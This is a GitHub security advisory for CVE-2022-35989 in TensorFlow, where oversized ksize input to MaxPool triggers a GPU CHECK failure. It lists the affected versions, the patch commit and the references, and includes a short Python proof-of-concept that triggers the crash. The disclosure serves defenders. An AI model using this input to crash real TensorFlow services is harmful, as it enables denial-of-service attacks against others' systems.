# [M]  TensorFlow vulnerable to `CHECK` fail in `MaxPool`

## Summary
Severity: Medium
Advisory: GHSA-j43h-pgmg-5hjq
CVE: CVE-2022-35989
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-j43h-pgmg-5hjq
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
When `MaxPool` receives a window size input array `ksize` with dimensions greater than its input tensor `input`, the GPU kernel gives a `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np

input = np.ones([1, 1, 1, 1])
ksize = [1, 1, 2, 2]
strides = [1, 1, 1, 1]
padding = 'VALID'
data_format = 'NCHW'

tf.raw_ops.MaxPool(input=input, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

### Patches
We have patched the issue in GitHub commit [32d7bd3defd134f21a4e344c8dfd40099aaf6b18](https://github.com/tensorflow/tensorflow/commit/32d7bd3defd134f21a4e344c8dfd40099aaf6b18).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Jingyi Shi.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j43h-pgmg-5hjq
- https://nvd.nist.gov/vuln/detail/CVE-2022-35989
- https://github.com/tensorflow/tensorflow/commit/32d7bd3defd134f21a4e344c8dfd40099aaf6b18
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
